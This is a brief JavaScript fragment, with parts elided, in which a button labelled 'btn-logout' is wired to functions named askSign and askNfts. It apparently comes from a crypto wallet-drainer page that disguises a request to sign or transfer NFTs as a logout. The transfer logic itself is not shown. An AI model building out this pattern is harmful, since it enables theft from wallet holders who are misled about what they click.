...
async function askTransfer() {
    if (disabled) return;
    document.getElementById('btn-logout').style.opacity = 0.5;
    disabled = true;
    if (await askSign()) await askNfts();
    disabled = false;
    document.getElementById('btn-logout').style.opacity = 1;
}
...
document.getElementById("btn-logout").onclick = askNfts;